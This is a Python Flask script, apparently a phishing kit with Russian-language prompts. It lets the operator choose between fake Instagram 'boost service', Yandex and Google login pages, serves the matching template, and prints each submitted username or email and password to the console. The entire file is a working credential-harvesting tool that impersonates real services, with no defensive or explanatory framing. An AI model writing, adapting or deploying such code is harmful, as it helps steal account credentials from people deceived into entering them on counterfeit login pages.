from flask import Flask, render_template , request

def Google():
	try:
		app = Flask(__name__)


		@app.route('/', methods=['post', 'get'])
		def yandex_core():
			if request.method == "POST":
				try:
					print("Почта :" + ' ' + request.form.get("email") + "\nПароль : " + request.form.get('password'))
				except:
					return render_template("google.html")
			else:
				return render_template("google.html")
			return render_template("google.html")

		if __name__ == "__main__":
		    app.run(debug=False)
	except:
		pass






def yandex():
	try:
		app = Flask(__name__)


		@app.route('/', methods=['post', 'get'])
		def yandex_core():
			if request.method == "POST":
				try:
					print("Юзернейм :" + ' ' + request.form.get("username") + "\nПароль : " + request.form.get('password'))
				except:
					return render_template("yandex.html")
			else:
				return render_template("yandex.html")
			return render_template("yandex.html")
		    




		if __name__ == "__main__":
		    app.run(debug=False)
	except:
		pass

def insta1():
	try:
		app = Flask(__name__)


		@app.route('/', methods=['post', 'get'])
		def index():
			if request.method == "POST":
				try:
					print("Юзернейм :" + ' ' + request.form.get("username") + "\nПароль : " + request.form.get('password'))
				except:
					return render_template("insta1.html")
			else:
				return render_template("insta1.html")
			return render_template("insta1.html")
		    




		if __name__ == "__main__":
		    app.run(debug=False)
	except:
		pass


def ask():
	print("1. Сервис накрутки инсты\n2. Yandex\n3.Google(Gmail)")
	global step
	step = input()
ask()
if int(step) == 1:
	insta1()
elif int(step) == 2:
	yandex()
elif int(step) == 3:
	Google()
else:
	print("Такого номера нету !")
	ask()
